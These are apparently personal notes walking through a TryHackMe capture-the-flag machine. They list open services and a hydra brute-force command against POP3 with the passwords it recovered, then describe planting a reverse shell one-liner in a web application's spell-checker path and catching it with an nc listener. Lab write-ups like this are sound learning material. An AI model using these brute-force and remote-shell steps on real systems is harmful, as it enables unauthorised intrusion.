[https://tryhackme.com/r/room/goldeneye](https://tryhackme.com/r/room/goldeneye)
 
25 smtp postfix smtpd  
80 http apache 2.4.7  
55006 Dovecot pop3  
55007 Dovecot pop3
 
terminal.js in :80  
/sev-home/
 
login:  
boris:InvincibleHack3r
 
Certified GoldenEye Network Operator Supervisors:  
Natalya  
Boris
 
try login to smtp/pop3
 
telnet <ip> 25  
AUTH LOGIN  
(not available)
 
telnet <ip> 55006  
USER  
(connection closed)
 
telnet <ip> 55007  
USER boris  
PASS InvincibleHack3r  
(Wrong creds)
 
Use hydra on pop3:  
hydra -l boris -P rockyou.txt -s 55007 <ip> pop3
 
boris:secret1!
 
telnet <ip> 55007  
USER boris  
PASS secret1!  
LIST  
RETR 1
 
alec@janus.boss  
Xenia
 
hydra on natalya  
natalya:bird
 
username: xenia  
password: RCP90rulez!
 
see message with dr. doak  
hydra doak pop3
 
doak:goat
 
read emails
 
username: dr_doak  
password: 4England!
 
login to severnaya-station, see secret file
 
strings on image
 
find password for admin (remember note)
 
admin:xWinter1995x!
 
login to website as admin
 
go to site administration > server > system paths and put in a bash or python reverse shell oneliner in the aspell (spell checker) box. save
 
go to plugins > text editors > TinyMCE HTML editor and change engine to SPellShell.
 
start nc listener
 
Go to my profile > blogs > add new post, click spell check button